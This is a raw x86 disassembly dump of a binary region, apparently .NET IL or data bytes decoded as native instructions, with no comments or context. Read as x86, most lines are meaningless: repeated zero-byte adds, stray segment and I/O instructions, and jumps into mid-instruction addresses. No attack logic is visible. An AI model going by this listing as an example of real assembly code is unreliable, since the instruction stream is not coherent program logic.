  40460f:	add    DWORD PTR [ebx],ebx
  404611:	xor    BYTE PTR [ebx],al
  404613:	add    BYTE PTR [ebp+0x0],cl
  404616:	add    BYTE PTR [eax],al
  404618:	das    
  404619:	add    BYTE PTR [eax],al
  40461b:	adc    DWORD PTR [edx],eax
  40461d:	jnp    0x404658
  40461f:	add    BYTE PTR [eax],al
  404621:	add    al,0x2d
  404623:	daa    
  404624:	jae    0x404622
  404626:	add    BYTE PTR [eax],al
  404628:	or     cl,BYTE PTR [ebx]
  40462a:	pop    es
  40462b:	sar    BYTE PTR [ecx+0x28010000],1
  404631:	inc    esi
  404632:	add    BYTE PTR [eax],al
  404634:	or     ch,BYTE PTR [edi-0x31]
  404637:	add    BYTE PTR [eax],al
  404639:	or     ch,BYTE PTR [edi+0x0]
  40463c:	add    DWORD PTR [eax],eax
  40463e:	or     al,BYTE PTR [edi]
  404640:	jb     0x4045e6
  404642:	add    al,BYTE PTR [eax]
  404644:	jo     0x4046b9
  404646:	add    DWORD PTR [ecx],eax
  404648:	add    BYTE PTR [edx],cl
  40464a:	jp     0x404650
  40464c:	adc    al,0x51
  40464e:	add    al,0x2
  404650:	jnp    0x40468b
  404652:	add    BYTE PTR [eax],al
  404654:	add    al,0x3
  404656:	outs   dx,DWORD PTR ds:[esi]
  404657:	and    al,0x1
  404659:	add    BYTE PTR [edx],cl
  40465b:	push   ecx
  40465c:	fimul  WORD PTR [edx]
  40465e:	or     al,BYTE PTR [edx]
  404660:	push   es
  404661:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  404668:	sub    al,BYTE PTR [eax]
  40466a:	add    BYTE PTR [eax],al
  40466c:	add    DWORD PTR [eax],edx
  40466e:	add    BYTE PTR [eax],al
  404670:	add    BYTE PTR [eax],al
  404672:	xor    al,BYTE PTR [eax]
  404674:	adc    BYTE PTR [edx+0x0],al
  404677:	or     dh,BYTE PTR [esi]
  404679:	add    BYTE PTR [eax],al
  40467b:	add    DWORD PTR [ebx],ebx
  40467d:	xor    BYTE PTR [ebx],al
  40467f:	add    BYTE PTR [ebp+0x0],cl
  404682:	add    BYTE PTR [eax],al
  404684:	das    
  404685:	add    BYTE PTR [eax],al
  404687:	adc    DWORD PTR [edx],eax
  404689:	jnp    0x4046c4
  40468b:	add    BYTE PTR [eax],al
  40468d:	add    al,0x2d
  40468f:	daa    
  404690:	jae    0x40468e
  404692:	add    BYTE PTR [eax],al
  404694:	or     cl,BYTE PTR [ebx]
  404696:	pop    es
  404697:	sar    BYTE PTR [ecx+0x28010000],1
  40469d:	inc    esi
  40469e:	add    BYTE PTR [eax],al
  4046a0:	or     ch,BYTE PTR [edi-0x31]
  4046a3:	add    BYTE PTR [eax],al
  4046a5:	or     ch,BYTE PTR [edi+0x0]
  4046a8:	add    DWORD PTR [eax],eax
  4046aa:	or     al,BYTE PTR [edi]
  4046ac:	jb     0x404652
  4046ae:	add    al,BYTE PTR [eax]
  4046b0:	jo     0x404725
  4046b2:	add    DWORD PTR [ecx],eax
  4046b4:	add    BYTE PTR [edx],cl
  4046b6:	jp     0x4046bc
  4046b8:	adc    al,0x51
  4046ba:	add    al,0x2
  4046bc:	jnp    0x4046f7
  4046be:	add    BYTE PTR [eax],al
  4046c0:	add    al,0x3
  4046c2:	outs   dx,DWORD PTR ds:[esi]
  4046c3:	or     DWORD PTR [ecx],eax
  4046c5:	add    BYTE PTR [edx],cl
  4046c7:	push   ecx
  4046c8:	fimul  WORD PTR [edx]
  4046ca:	or     al,BYTE PTR [edx]
  4046cc:	push   es
  4046cd:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  4046d4:	sub    al,BYTE PTR [eax]
  4046d6:	add    BYTE PTR [eax],al
  4046d8:	add    DWORD PTR [eax],edx
  4046da:	add    BYTE PTR [eax],al
  4046dc:	add    BYTE PTR [eax],al
  4046de:	xor    al,BYTE PTR [eax]
  4046e0:	adc    BYTE PTR [edx+0x0],al
  4046e3:	or     dh,BYTE PTR [esi]
  4046e5:	add    BYTE PTR [eax],al
  4046e7:	add    DWORD PTR [ebx],ebx
  4046e9:	xor    BYTE PTR [eax+eax*1],al
  4046ec:	sgdtd  [eax]
  4046ef:	add    BYTE PTR [eax],dh
  4046f1:	add    BYTE PTR [eax],al
  4046f3:	adc    DWORD PTR [ebx],eax
  4046f5:	adc    al,0x51
  4046f7:	add    bh,BYTE PTR [ebx+0x39]
  4046fa:	add    BYTE PTR [eax],al
  4046fc:	add    al,0x2d
  4046fe:	sub    dh,BYTE PTR [ebx-0x4]
  404701:	add    BYTE PTR [eax],al
  404703:	or     dl,BYTE PTR [ebx]
  404705:	push   es
  404706:	adc    DWORD PTR [esi],eax
  404708:	sar    BYTE PTR [ecx+0x28010000],1
  40470e:	inc    esi
  40470f:	add    BYTE PTR [eax],al
  404711:	or     ch,BYTE PTR [edi-0x31]
  404714:	add    BYTE PTR [eax],al
  404716:	or     ch,BYTE PTR [edi+0x0]
  404719:	add    DWORD PTR [eax],eax
  40471b:	or     dl,BYTE PTR [ecx]
  40471d:	push   es
  40471e:	jb     0x4046c4
  404720:	add    al,BYTE PTR [eax]
  404722:	jo     0x404797
  404724:	add    DWORD PTR [ecx],eax
  404726:	add    BYTE PTR [edx],cl
  404728:	jp     0x40472c
  40472a:	jnp    0x404765
  40472c:	add    BYTE PTR [eax],al
  40472e:	add    al,0x6f
  404730:	and    eax,0xa0a0001
  404735:	push   es
  404736:	cmp    DWORD PTR [ecx+0x6000000],edi
  40473c:	outs   dx,DWORD PTR ds:[esi]
  40473d:	adc    BYTE PTR [ecx],al
  40473f:	add    BYTE PTR [edx],cl
  404741:	push   ss
  404742:	lods   eax,DWORD PTR ds:[esi]
  404744:	add    BYTE PTR [eax],al
  404746:	add    BYTE PTR [ebx],al
  404748:	push   es
  404749:	outs   dx,DWORD PTR ds:[esi]
  40474a:	adc    BYTE PTR [ecx],al
  40474c:	add    BYTE PTR [edx],cl
  40474e:	lea    edi,[edi]
  404750:	add    BYTE PTR [eax],al
  404752:	add    DWORD PTR [ecx+0x16],edx
  404755:	or     eax,DWORD PTR [esi]
  404757:	outs   dx,DWORD PTR ds:[esi]
  404758:	adc    DWORD PTR [ecx],eax
  40475a:	add    BYTE PTR [edx],cl
  40475c:	adc    eax,DWORD PTR [edi]
  40475e:	sub    esi,DWORD PTR [ecx+edx*1+0x7]
  404762:	outs   dx,DWORD PTR ds:[esi]
  404763:	xchg   ebx,eax
  404764:	add    BYTE PTR [eax],al
  404766:	or     ah,BYTE PTR [ebp+0x10000bf]
  40476c:	or     al,0x12
  40476e:	add    ch,BYTE PTR [eax]
  404770:	adc    al,BYTE PTR [ecx]
  404772:	add    BYTE PTR [edx],cl
  404774:	je     0x404737
  404776:	add    BYTE PTR [eax],al
  404778:	add    DWORD PTR ds:0x73075003,ecx
  40477e:	add    DWORD PTR es:[eax],eax
  404781:	or     dl,BYTE PTR [ebx]
  404783:	add    al,0x11
  404785:	add    al,0x12
  404787:	add    ch,BYTE PTR [eax]
  404789:	sbb    BYTE PTR [ecx],al
  40478b:	add    BYTE PTR [edx],cl
  40478d:	je     0x4047f8
  40478f:	add    BYTE PTR [eax],al
  404791:	add    DWORD PTR [edi+0x27],ebp
  404794:	add    DWORD PTR [eax],eax
  404796:	or     dl,BYTE PTR [ecx]
  404798:	add    al,0x9
  40479a:	jnp    0x4047c4
  40479c:	add    DWORD PTR [eax],eax
  40479e:	or     dh,BYTE PTR [ecx+ebp*2+0x0]
  4047a2:	add    BYTE PTR [ecx],al
  4047a4:	outs   dx,DWORD PTR ds:[esi]
  4047a5:	sub    DWORD PTR [ecx],eax
  4047a7:	add    BYTE PTR [edx],cl
  4047a9:	adc    DWORD PTR [ecx+ecx*1],eax
  4047ac:	jnp    0x4047d8
  4047ae:	add    DWORD PTR [eax],eax
  4047b0:	or     dh,BYTE PTR [ecx+ebp*2+0x0]
  4047b4:	add    BYTE PTR [ecx],al
  4047b6:	outs   dx,DWORD PTR ds:[esi]
  4047b7:	sub    eax,DWORD PTR [ecx]
  4047b9:	add    BYTE PTR [edx],cl
  4047bb:	adc    DWORD PTR [ecx+ecx*1],eax
  4047be:	jnp    0x4047ec
  4047c0:	add    DWORD PTR [eax],eax
  4047c2:	or     ah,BYTE PTR [ebp+0x100007e]
  4047c8:	outs   dx,DWORD PTR ds:[esi]
  4047c9:	sub    eax,0x110a0001
  4047ce:	add    al,0xa2
  4047d0:	pop    es
  4047d1:	pop    ss
  4047d2:	pop    eax
  4047d3:	or     edx,DWORD PTR [ecx]
  4047d5:	pop    es
  4047d6:	outs   dx,DWORD PTR ds:[esi]
  4047d7:	test   BYTE PTR [eax],al
  4047d9:	add    BYTE PTR [edx],cl
  4047db:	sub    eax,0x1115de83
  4047e0:	pop    es
  4047e1:	jne    0x4047f5
  4047e3:	add    BYTE PTR [eax],al
  4047e5:	add    DWORD PTR [ebx],edx
  4047e7:	or     BYTE PTR [ecx],dl
  4047e9:	or     BYTE PTR [edi+eax*1],ch
  4047ec:	adc    DWORD PTR [eax],ecx
  4047ee:	outs   dx,DWORD PTR ds:[esi]
  4047ef:	inc    ebx
  4047f0:	add    BYTE PTR [eax],al
  4047f2:	or     bl,ah
  4047f4:	fimul  WORD PTR [ebx+edx*1]
  4047f7:	add    eax,0x28051102
  4047fc:	mov    WORD PTR [eax],es
  4047fe:	add    BYTE PTR [esi],al
  404800:	fiadd  WORD PTR [eax]
  404802:	sub    al,BYTE PTR [eax]
  404804:	add    DWORD PTR [eax+eax*1],ebx
  404807:	add    BYTE PTR [edx],al
  404809:	add    BYTE PTR [edx+0x0],ch
  40480c:	sub    ebx,0x1500
  404812:	add    BYTE PTR [eax],al
  404814:	add    BYTE PTR [eax],al
  404816:	xor    eax,0x102cd00
  40481b:	or     al,0x36
  40481d:	add    BYTE PTR [eax],al
  40481f:	add    DWORD PTR [ebx],ebx
  404821:	xor    BYTE PTR [ebx],al
  404823:	add    BYTE PTR [edx+0x31000000],bh
  404829:	add    BYTE PTR [eax],al
  40482b:	adc    DWORD PTR [edx],eax
  40482d:	jnp    0x404868
  40482f:	add    BYTE PTR [eax],al
  404831:	add    al,0x2d
  404833:	sub    dh,BYTE PTR [ebx-0x4]
  404836:	add    BYTE PTR [eax],al
  404838:	or     dl,BYTE PTR [ebx]
  40483a:	add    eax,0xb9d00511
  40483f:	add    BYTE PTR [eax],al
  404841:	add    DWORD PTR [eax],ebp
  404843:	inc    esi
  404844:	add    BYTE PTR [eax],al
  404846:	or     ch,BYTE PTR [edi-0x31]
  404849:	add    BYTE PTR [eax],al
  40484b:	or     ch,BYTE PTR [edi+0x0]
  40484e:	add    DWORD PTR [eax],eax
  404850:	or     dl,BYTE PTR [ecx]
  404852:	add    eax,0x2a472
  404857:	jo     0x4048cc
  404859:	add    DWORD PTR [ecx],eax
  40485b:	add    BYTE PTR [edx],cl
  40485d:	jp     0x404873
  40485f:	or     al,BYTE PTR [eax+ebp*1]
  404862:	add    DWORD PTR cs:[eax],eax
  404865:	or     cl,BYTE PTR [ebx]
  404867:	pop    es
  404868:	add    edx,DWORD PTR [edi]
  40486a:	outs   dx,DWORD PTR ds:[esi]
  40486b:	das    
  40486c:	add    DWORD PTR [eax],eax
  40486e:	or     cl,BYTE PTR [edx]
  404870:	fimul  WORD PTR [edx]
  404872:	or     al,0x2
  404874:	or     BYTE PTR [eax],ch
  404876:	mov    WORD PTR [eax],es
  404878:	add    BYTE PTR [esi],al
  40487a:	fiadd  WORD PTR [eax]
  40487c:	adc    al,0xd
  40487e:	add    al,BYTE PTR [esi]
  404880:	add    eax,0x8728
  404885:	push   es
  404886:	or     eax,0x20265bde
  40488b:	cli    
  40488c:	add    BYTE PTR [eax],al
  40488e:	add    BYTE PTR [eax],ch
  404890:	inc    edx
  404891:	add    BYTE PTR [eax],al
  404893:	or     al,BYTE PTR [edx]
  404895:	jnp    0x4048d0
  404897:	add    BYTE PTR [eax],al
  404899:	add    al,0x6f
  40489b:	add    al,BYTE PTR [ecx]
  40489d:	add    BYTE PTR [edx],cl
  40489f:	sub    al,0x2a
  4048a1:	add    bh,BYTE PTR [ebx+0x41]
  4048a4:	add    BYTE PTR [eax],al
  4048a6:	add    al,0x6f
  4048a8:	xor    BYTE PTR [ecx],al
  4048aa:	add    BYTE PTR [edx],cl
  4048ac:	add    bh,BYTE PTR es:[ebx+0x39]
  4048b0:	add    BYTE PTR [eax],al
  4048b2:	add    al,0x6f
  4048b4:	add    eax,DWORD PTR [ecx]
  4048b6:	add    BYTE PTR [edx],cl
  4048b8:	add    bh,BYTE PTR es:[ebx+0x41]
  4048bc:	add    BYTE PTR [eax],al
  4048be:	add    al,0x20
  4048c0:	mov    BYTE PTR [ebx],dl
  4048c2:	add    BYTE PTR [eax],al
  4048c4:	pop    ss
  4048c5:	outs   dx,DWORD PTR ds:[esi]
  4048c6:	xor    DWORD PTR [ecx],eax
  4048c8:	add    BYTE PTR [edx],cl
  4048ca:	add    al,BYTE PTR es:[esi]
  4048cd:	add    eax,0x8728
  4048d2:	push   es
  4048d3:	or     eax,0x4130cde
  4048d8:	add    dl,BYTE PTR [ecx]
  4048da:	add    al,0x28
  4048dc:	mov    WORD PTR [eax],es
  4048de:	add    BYTE PTR [esi],al
  4048e0:	fiadd  WORD PTR [eax]
  4048e2:	fiadd  WORD PTR [eax]
  4048e4:	or     DWORD PTR [edx],ebp
  4048e6:	add    BYTE PTR [eax],al
  4048e8:	add    DWORD PTR [eax],ebp
  4048ea:	add    BYTE PTR [eax],al
  4048ec:	add    BYTE PTR [eax],al
  4048ee:	xor    al,0x0
  4048f0:	adc    al,BYTE PTR [esi+0x0]
  4048f3:	or     dh,BYTE PTR [esi]
  4048f5:	add    BYTE PTR [eax],al
  4048f7:	add    DWORD PTR [eax],eax
  4048f9:	add    BYTE PTR [esi+0x0],bl
  4048fc:	dec    esp
  4048fd:	stos   BYTE PTR es:[edi],al
  4048fe:	add    BYTE PTR [esi+esi*1],cl
  404901:	add    BYTE PTR [eax],al
  404903:	add    DWORD PTR [eax],eax
  404905:	add    BYTE PTR [edx+0x0],dl
  404908:	or     ebx,DWORD PTR [ebp+0x0]
  40490b:	pop    ebx
  40490c:	add    BYTE PTR ss:[eax],al
  40490f:	add    DWORD PTR [ebx],ebx
  404911:	xor    BYTE PTR [edi],al
  404913:	add    BYTE PTR [edx],cl
  404915:	add    DWORD PTR [eax],eax
  404917:	add    BYTE PTR [edx],dh
  404919:	add    BYTE PTR [eax],al
  40491b:	adc    DWORD PTR [edx],eax
  40491d:	jnp    0x40495d
  40491f:	add    BYTE PTR [eax],al
  404921:	add    al,0x6f
  404923:	xor    al,0x0
  404925:	add    BYTE PTR [esi],al
  404927:	sub    eax,0x397b0223
  40492c:	add    BYTE PTR [eax],al
  40492e:	add    al,0x2
  404930:	jnp    0x404967
  404932:	add    BYTE PTR [eax],al
  404934:	add    al,0x6f
  404936:	and    BYTE PTR [ecx],al
  404938:	add    BYTE PTR [edx],cl
  40493a:	or     al,BYTE PTR [edx]
  40493c:	jnp    0x40497c
  40493e:	add    BYTE PTR [eax],al
  404940:	add    al,0x6
  404942:	outs   dx,DWORD PTR ds:[esi]
  404943:	dec    eax
  404944:	add    BYTE PTR [eax],al
  404946:	push   es
  404947:	fiadd  WORD PTR [ebx]
  404949:	fiadd  WORD PTR es:[eax]
  40494c:	add    bh,BYTE PTR [ebx+0x39]
  40494f:	add    BYTE PTR [eax],al
  404951:	add    al,0x6f
  404953:	add    al,BYTE PTR [ecx]
  404955:	add    BYTE PTR [edx],cl
  404957:	sub    eax,0x39d027
  40495c:	add    BYTE PTR [ecx],al
  40495e:	sub    BYTE PTR [esi+0x0],al
  404961:	add    BYTE PTR [edx],cl
  404963:	jb     0x40493f
  404965:	add    al,0x0
  404967:	jo     0x404989
  404969:	and    al,0x1
  40496b:	add    BYTE PTR [eax],al
  40496d:	adc    al,0x2
  40496f:	jnp    0x4049aa
  404971:	add    BYTE PTR [eax],al
  404973:	add    al,0x14
  404975:	sub    BYTE PTR [edx],dh
  404977:	add    DWORD PTR [eax],eax
  404979:	or     ch,BYTE PTR [eax]
  40497b:	xor    eax,DWORD PTR [ecx]
  40497d:	add    BYTE PTR [edx],cl
  40497f:	add    bh,BYTE PTR es:[ebx+0x39]
  404983:	add    BYTE PTR [eax],al
  404985:	add    al,0x3
  404987:	push   ss
  404988:	outs   dx,DWORD PTR ds:[esi]
  404989:	xor    al,0x1
  40498b:	add    BYTE PTR [edx],cl
  40498d:	or     edx,DWORD PTR [esi]
  40498f:	adc    eax,DWORD PTR ds:0x7132507
  404995:	adc    al,BYTE PTR ds:0x9c28
  40499b:	or     al,BYTE PTR [edx]
  40499d:	jnp    0x4049d8
  40499f:	add    BYTE PTR [eax],al
  4049a1:	add    al,0xd0
  4049a3:	or     al,BYTE PTR [eax]
  4049a5:	add    BYTE PTR [edx],al
  4049a7:	sub    BYTE PTR [esi+0x0],al
  4049aa:	add    BYTE PTR [edx],cl
  4049ac:	push   ss
  4049ad:	outs   dx,DWORD PTR ds:[esi]
  4049ae:	xor    al,0x1
  4049b0:	add    BYTE PTR [edx],cl
  4049b2:	je     0x4049be
  4049b4:	add    BYTE PTR [eax],al
  4049b6:	add    cl,BYTE PTR [eax+ecx*1]
  4049b9:	add    bh,BYTE PTR [ebx+0x3e]
  4049bc:	add    BYTE PTR [eax],al
  4049be:	add    al,0x6f
  4049c0:	aaa    
  4049c1:	add    BYTE PTR [eax],al
  4049c3:	push   es
  4049c4:	sbb    BYTE PTR [esi+edx*1],al
  4049c7:	outs   dx,DWORD PTR ds:[esi]
  4049c8:	test   al,0x0
  4049ca:	add    BYTE PTR [edx],cl
  4049cc:	pop    eax
  4049cd:	lea    eax,[ecx]
  4049cf:	add    BYTE PTR [eax],al
  4049d1:	add    DWORD PTR ds:0x7b021609,ecx
  4049d7:	cmp    DWORD PTR [eax],eax
  4049d9:	add    BYTE PTR [edx+eiz*4],al
  4049dc:	or     DWORD PTR [edi],edx
  4049de:	or     BYTE PTR [edx+0x2b041316],ah
  4049e4:	adc    BYTE PTR [ecx],cl
  4049e6:	sbb    BYTE PTR [ecx],dl
  4049e8:	add    al,0x58
  4049ea:	add    al,0x11
  4049ec:	add    al,0x9a
  4049ee:	mov    ds:0x58170411,al
  4049f3:	adc    eax,DWORD PTR [ecx+edx*1]
  4049f6:	add    al,0x4
  4049f8:	push   ss
  4049f9:	outs   dx,DWORD PTR ds:[esi]
  4049fa:	test   al,0x0
  4049fc:	add    BYTE PTR [edx],cl
  4049fe:	xor    ah,ch
  404a00:	add    esi,DWORD PTR [edx-0x2]
  404a03:	add    al,0x0
  404a05:	jo     0x404a27
  404a07:	xor    al,0x1
  404a09:	add    BYTE PTR [eax],al
  404a0b:	adc    al,0x7
  404a0d:	or     DWORD PTR [edi+0x35],ebp
  404a10:	add    DWORD PTR [eax],eax
  404a12:	or     dl,BYTE PTR [ebx]
  404a14:	push   es
  404a15:	fimul  WORD PTR [ecx+edx*1]
  404a18:	add    eax,0x711072c
  404a1d:	sub    BYTE PTR [esi-0x23f60000],bl
  404a23:	adc    DWORD PTR [esi],eax
  404a25:	sub    al,BYTE PTR [eax]
  404a27:	add    BYTE PTR [ecx],al
  404a29:	sbb    al,0x0
  404a2b:	add    BYTE PTR [eax],al
  404a2d:	add    BYTE PTR ds:0x2d2000,cl
  404a33:	add    eax,DWORD PTR [ecx]
  404a35:	add    BYTE PTR [eax],al
  404a37:	add    DWORD PTR [edx],eax
  404a39:	add    BYTE PTR [ebp+0x0],dh
  404a3c:	xchg   bl,bh
  404a3e:	add    BYTE PTR [eax+eax*1],cl
  404a41:	add    BYTE PTR [eax],al
  404a43:	add    BYTE PTR [edx],ch
  404a45:	add    dl,BYTE PTR [esi]
  404a47:	adc    al,0x3
  404a49:	sub    BYTE PTR [ebp+0x2a060000],cl
  404a4f:	sub    al,BYTE PTR [edx]
  404a51:	pop    ss
  404a52:	add    edx,DWORD PTR [esi]
  404a54:	sub    BYTE PTR [ebp+0x2a060000],cl
  404a5a:	push   es
  404a5b:	sub    ah,BYTE PTR [edx]
  404a5d:	add    dl,BYTE PTR [edi]
  404a5f:	sub    BYTE PTR [eax+eax*1+0x0],dh
  404a63:	push   es
  404a64:	sub    al,BYTE PTR [eax]
  404a66:	add    BYTE PTR [eax],al
  404a68:	adc    esi,DWORD PTR [eax]
  404a6a:	add    al,BYTE PTR [eax]
  404a6c:	mov    ah,0x1
  404a6e:	add    BYTE PTR [eax],al
  404a70:	xor    eax,DWORD PTR [eax]
  404a72:	add    BYTE PTR [ecx],dl
  404a74:	add    esi,DWORD PTR [ebp+0x28]
  404a77:	add    BYTE PTR [eax],al
  404a79:	add    DWORD PTR [edi+ecx*2],ebp
  404a7c:	add    esi,DWORD PTR [ebp+0x28]
  404a7f:	add    BYTE PTR [eax],al
  404a81:	add    DWORD PTR [edx],ecx
  404a83:	jae    0x404a81
  404a85:	add    BYTE PTR [eax],al
  404a87:	or     cl,BYTE PTR [ebx]
  404a89:	pop    es
  404a8a:	push   es
  404a8b:	outs   dx,DWORD PTR ds:[esi]
  404a8c:	jnp    0x404a8e
  404a8e:	add    BYTE PTR [edx],cl
  404a90:	outs   dx,DWORD PTR ds:[esi]
  404a91:	inc    BYTE PTR [eax]
  404a93:	add    BYTE PTR [edx],cl
  404a95:	pop    es
  404a96:	push   es
  404a97:	outs   dx,DWORD PTR ds:[esi]
  404a98:	inc    DWORD PTR [eax]
  404a9a:	add    BYTE PTR [edx],cl
  404a9c:	outs   dx,DWORD PTR ds:[esi]
  404a9d:	iret   
  404a9e:	add    BYTE PTR [eax],al
  404aa0:	or     ch,BYTE PTR [edi+0x0]
  404aa3:	add    DWORD PTR [eax],eax
  404aa5:	or     al,BYTE PTR [edi]
  404aa7:	push   es
  404aa8:	outs   dx,DWORD PTR ds:[esi]
  404aa9:	jns    0x404aab
  404aab:	add    BYTE PTR [edx],cl
  404aad:	outs   dx,DWORD PTR ds:[esi]
  404aae:	add    DWORD PTR ss:[eax],eax
  404ab1:	or     al,BYTE PTR [edi]
  404ab3:	push   es
  404ab4:	outs   dx,DWORD PTR ds:[esi]
  404ab5:	jp     0x404ab7
  404ab7:	add    BYTE PTR [edx],cl
  404ab9:	outs   dx,DWORD PTR ds:[esi]
  404aba:	aaa    
  404abb:	add    DWORD PTR [eax],eax
  404abd:	or     al,BYTE PTR [edi]
  404abf:	push   es
  404ac0:	outs   dx,DWORD PTR ds:[esi]
  404ac1:	std    
  404ac2:	add    BYTE PTR [eax],al
  404ac4:	or     dh,BYTE PTR [ebx+0x1]
  404ac7:	add    DWORD PTR [eax],eax
  404ac9:	or     bh,BYTE PTR [edx+0x3]
  404acc:	jne    0x404a92
  404ace:	add    BYTE PTR [eax],al
  404ad0:	add    DWORD PTR [edi+esi*1],ebp
  404ad3:	add    esi,DWORD PTR [ebp-0x3c]
  404ad6:	add    BYTE PTR [eax],al
  404ad8:	add    DWORD PTR [ebx+esi*2],ecx
  404adb:	cld    
  404adc:	add    BYTE PTR [eax],al
  404ade:	or     cl,BYTE PTR ds:0xfd6f0809
  404ae4:	add    BYTE PTR [eax],al
  404ae6:	or     ch,BYTE PTR [edi-0x2]
  404ae9:	add    BYTE PTR [eax],al
  404aeb:	or     cl,BYTE PTR [ecx]
  404aed:	or     BYTE PTR [edi-0x1],ch
  404af0:	add    BYTE PTR [eax],al
  404af2:	or     ch,BYTE PTR [edi-0x31]
  404af5:	add    BYTE PTR [eax],al
  404af7:	or     ch,BYTE PTR [edi+0x0]
  404afa:	add    DWORD PTR [eax],eax
  404afc:	or     cl,BYTE PTR [ecx]
  404afe:	or     BYTE PTR [edi-0x3],ch
  404b01:	add    BYTE PTR [eax],al
  404b03:	or     dh,BYTE PTR [ebx+0x1]
  404b06:	add    DWORD PTR [eax],eax
  404b08:	or     bh,BYTE PTR [edx+0x3]
  404b0b:	jne    0x404ad2
  404b0d:	add    BYTE PTR [eax],al
  404b0f:	add    DWORD PTR [ebx+ebx*2],ebp
  404b12:	add    esi,DWORD PTR [ebp-0x3b]
  404b15:	add    BYTE PTR [eax],al
  404b17:	add    DWORD PTR [ebx],edx
  404b19:	add    al,0x73
  404b1b:	cld    
  404b1c:	add    BYTE PTR [eax],al
  404b1e:	or     dl,BYTE PTR [ebx]
  404b20:	add    eax,0x4110511
  404b25:	outs   dx,DWORD PTR ds:[esi]
  404b26:	std    
  404b27:	add    BYTE PTR [eax],al
  404b29:	or     ch,BYTE PTR [edi-0x2]
  404b2c:	add    BYTE PTR [eax],al
  404b2e:	or     dl,BYTE PTR [ecx]
  404b30:	add    eax,0xff6f0411
  404b35:	add    BYTE PTR [eax],al
  404b37:	or     ch,BYTE PTR [edi-0x31]
  404b3a:	add    BYTE PTR [eax],al
  404b3c:	or     ch,BYTE PTR [edi+0x0]
  404b3f:	add    DWORD PTR [eax],eax
  404b41:	or     dl,BYTE PTR [ecx]
  404b43:	add    eax,0x386f0411
  404b48:	add    DWORD PTR [eax],eax
  404b4a:	or     ch,BYTE PTR [edi+0x36]
  404b4d:	add    DWORD PTR [eax],eax
  404b4f:	or     dl,BYTE PTR [ecx]
  404b51:	add    eax,0x396f0411
  404b56:	add    DWORD PTR [eax],eax
  404b58:	or     ch,BYTE PTR [edi+0x37]
  404b5b:	add    DWORD PTR [eax],eax
  404b5d:	or     dl,BYTE PTR [ecx]
  404b5f:	add    eax,0xfd6f0411
  404b64:	add    BYTE PTR [eax],al
  404b66:	or     dh,BYTE PTR [ebx+0x1]
  404b69:	add    DWORD PTR [eax],eax
  404b6b:	or     bh,BYTE PTR [edx+0x3]
  404b6e:	jne    0x404b36
  404b70:	add    BYTE PTR [eax],al
  404b72:	add    DWORD PTR [edi+edi*2],ebp
  404b75:	add    ebp,DWORD PTR [edi+0x3a]
  404b78:	add    DWORD PTR [eax],eax
  404b7a:	or     ch,BYTE PTR [ebx+eax*2]
  404b7d:	jae    0x404b7b
  404b7f:	add    BYTE PTR [eax],al
  404b81:	or     dl,BYTE PTR [ebx]
  404b83:	push   es
  404b84:	adc    DWORD PTR [esi],eax
  404b86:	add    ebp,DWORD PTR [edi+0x3a]
  404b89:	add    DWORD PTR [eax],eax
  404b8b:	or     ch,BYTE PTR [edi-0x3]
  404b8e:	add    BYTE PTR [eax],al
  404b90:	or     ch,BYTE PTR [edi-0x2]
  404b93:	add    BYTE PTR [eax],al
  404b95:	or     dl,BYTE PTR [ecx]
  404b97:	push   es
  404b98:	add    ebp,DWORD PTR [edi+0x3a]
  404b9b:	add    DWORD PTR [eax],eax
  404b9d:	or     ch,BYTE PTR [edi-0x1]
  404ba0:	add    BYTE PTR [eax],al
  404ba2:	or     ch,BYTE PTR [edi-0x31]
  404ba5:	add    BYTE PTR [eax],al
  404ba7:	or     ch,BYTE PTR [edi+0x0]
  404baa:	add    DWORD PTR [eax],eax
  404bac:	or     dl,BYTE PTR [ecx]
  404bae:	push   es
  404baf:	add    ebp,DWORD PTR [edi+0x3a]
  404bb2:	add    DWORD PTR [eax],eax
  404bb4:	or     ch,BYTE PTR [edi-0x3]
  404bb7:	add    BYTE PTR [eax],al
  404bb9:	or     dh,BYTE PTR [ebx+0x1]
  404bbc:	add    DWORD PTR [eax],eax
  404bbe:	or     bh,BYTE PTR [edx+0x73]
  404bc1:	cld    
  404bc2:	add    BYTE PTR [eax],al
  404bc4:	or     dl,BYTE PTR [ebx]
  404bc6:	pop    es
  404bc7:	adc    DWORD PTR [edi],eax
  404bc9:	add    ebp,DWORD PTR [edi-0x3]
  404bcc:	add    BYTE PTR [eax],al
  404bce:	or     ch,BYTE PTR [edi-0x2]
  404bd1:	add    BYTE PTR [eax],al
  404bd3:	or     dl,BYTE PTR [ecx]
  404bd5:	pop    es
  404bd6:	add    ebp,DWORD PTR [edi-0x1]
  404bd9:	add    BYTE PTR [eax],al
  404bdb:	or     ch,BYTE PTR [edi-0x31]
  404bde:	add    BYTE PTR [eax],al
  404be0:	or     ch,BYTE PTR [edi+0x0]
  404be3:	add    DWORD PTR [eax],eax
  404be5:	or     dl,BYTE PTR [ecx]
  404be7:	pop    es
  404be8:	add    ebp,DWORD PTR [edi-0x3]
  404beb:	add    BYTE PTR [eax],al
  404bed:	or     dh,BYTE PTR [ebx+0x1]
  404bf0:	add    DWORD PTR [eax],eax
  404bf2:	or     bh,BYTE PTR [edx+0x73]
  404bf5:	cld    
  404bf6:	add    BYTE PTR [eax],al
  404bf8:	or     dl,BYTE PTR [ebx]
  404bfa:	or     BYTE PTR [ecx],dl
  404bfc:	or     BYTE PTR [ebx],al
  404bfe:	outs   dx,DWORD PTR ds:[esi]
  404bff:	std    
  404c00:	add    BYTE PTR [eax],al
  404c02:	or     ch,BYTE PTR [edi-0x2]
  404c05:	add    BYTE PTR [eax],al
  404c07:	or     dl,BYTE PTR [ecx]
  404c09:	or     BYTE PTR [ebx],al
  404c0b:	outs   dx,DWORD PTR ds:[esi]
  404c0c:	inc    DWORD PTR [eax]
  404c0e:	add    BYTE PTR [edx],cl
  404c10:	outs   dx,DWORD PTR ds:[esi]
  404c11:	iret   
  404c12:	add    BYTE PTR [eax],al
  404c14:	or     ch,BYTE PTR [edi+0x0]
  404c17:	add    DWORD PTR [eax],eax
  404c19:	or     dl,BYTE PTR [ecx]
  404c1b:	or     BYTE PTR [ebx],al
  404c1d:	outs   dx,DWORD PTR ds:[esi]
  404c1e:	std    
  404c1f:	add    BYTE PTR [eax],al
  404c21:	or     dh,BYTE PTR [ebx+0x1]
  404c24:	add    DWORD PTR [eax],eax
  404c26:	or     bh,BYTE PTR [edx+0x1b]
  404c29:	xor    BYTE PTR [ebx],al
  404c2b:	add    BYTE PTR [edx],dh
  404c2d:	add    DWORD PTR [eax],eax
